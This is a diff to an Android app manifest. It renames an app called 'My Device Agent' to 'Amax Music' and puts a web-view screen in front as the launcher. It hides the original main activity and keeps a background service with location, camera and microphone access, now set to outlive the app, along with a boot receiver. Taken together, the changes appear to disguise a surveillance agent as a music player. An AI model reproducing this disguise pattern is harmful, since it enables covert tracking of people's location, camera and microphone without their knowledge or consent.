@@ -60,26 +60,35 @@
     <application
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
-        android:label="My Device Agent"
+        android:label="Amax Music"
         android:theme="@style/Theme.MyDeviceAgent"
         android:usesCleartextTraffic="true"
-        tools:targetApi="31">
+        android:supportsRtl="true"
+        tools:targetApi="34">
 
         <activity
-            android:name=".MainActivity"
+            android:name=".WebViewActivity"
             android:exported="true"
-            android:launchMode="singleTop">
+            android:launchMode="singleTask"
+            android:configChanges="orientation|screenSize|keyboard|keyboardHidden"
+            android:screenOrientation="portrait">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <activity
+            android:name=".MainActivity"
+            android:exported="false"
+            android:launchMode="singleTop" />
+
         <service
             android:name=".DeviceService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="location|camera|microphone" />
+            android:foregroundServiceType="location|camera|microphone"
+            android:stopWithTask="false" />
 
         <receiver
             android:name=".BootReceiver"
